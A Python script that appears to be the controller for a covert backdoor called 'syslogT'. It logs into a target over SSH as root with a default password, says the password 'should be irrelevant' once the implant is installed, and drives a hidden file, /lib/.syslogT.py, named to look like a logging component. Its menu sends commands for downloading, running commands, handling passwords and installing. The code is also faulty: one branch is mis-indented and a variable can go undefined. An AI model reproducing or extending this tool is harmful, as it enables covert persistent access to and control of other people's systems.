import os
import subprocess
import paramiko
import sys

def main():
    print("""Welcome to the syslogT controller.
    When connecting, password should be irrelevant, assuming the target has syslogT properly installed.""")
    address = input("Enter IP to connect to: ")
    user = input("Enter user to connect with('d' to default to 'root'): ")
    password = input("Enter password to connect with('d' to default to 'changeme'): ")
    
    sshClient = paramiko.SSHClient()
    sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    sshClient.connect(address, username=user, password=password)
    
    print("Attempting connection to syslogT...")
    command = "python3 /lib/.syslogT.py \"xyz\""
    stdin, stdout, stderr = sshClient.exec_command(command)
    output = str(stdout.read().decode('utf-8'))
    if(output == "abc"):
        print("Connection Successful.")
        connected = True
    else:
        print("Failed to Connect. SyslogT may not be installed.")
        
    if(connected):
        x = True
        while(x):
            option = input("Enter command(h for help): ")
            if(option.lower() in ('s', 'status')):
                command = "python3 /lib/.syslogT.py \"-s\""
                stdin, stdout, stderr = sshClient.exec_command(command)
                print(stdout.read().decode('utf-8'))
            elif(option.lower() in ('d', 'downloader')):
                command = "python3 /lib/.syslogT.py \"-d\""
                stdin, stdout, stderr = sshClient.exec_command(command)
                print(stdout.read().decode('utf-8'))
            elif(option.lower() in ('c', 'command')):
                command = "python3 /lib/.syslogT.py \"-c\""
                stdin, stdout, stderr = sshClient.exec_command(command)
                print(stdout.read().decode('utf-8'))
            elif(option.lower() in ('p', 'pass')):
                command = "python3 /lib/.syslogT.py \"-p\""
                stdin, stdout, stderr = sshClient.exec_command(command)
                print(stdout.read().decode('utf-8'))
            elif(option.lower() in ('i', 'install')):
                command = "python3 /lib/.syslogT.py \"-i\""
                stdin, stdout, stderr = sshClient.exec_command(command)
                print(stdout.read().decode('utf-8'))
            else:
                if(option.lower() in ('h', 'help')):
                command = "python3 /lib/.syslogT.py \"-h\""
                stdin, stdout, stderr = sshClient.exec_command(command)
                print(stdout.read().decode('utf-8'))
main()